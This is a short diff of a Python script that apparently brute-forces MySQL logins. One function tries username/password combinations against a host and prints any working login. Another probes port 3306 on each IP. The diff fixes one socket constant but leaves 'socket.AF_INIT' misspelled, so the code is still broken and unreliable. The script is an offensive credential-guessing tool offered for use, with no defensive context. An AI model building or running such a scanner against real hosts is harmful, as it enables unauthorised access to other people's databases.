@@ -39,7 +39,7 @@ def raffy(ip:str):
             print('Working login found! - username: '+combo[0] +' password: '+combo[1] +'host: '+ip)
 
 def check(ip:str):
-    soc = socket.socket(socket.AF_INIT, socket_SOCKET_STREAM)
+    soc = socket.socket(socket.AF_INIT, socket.SOCK_STREAM)
     soc.settimeout(2)
     try:
         soc.connect((ip, 3306)) # mysql port :)
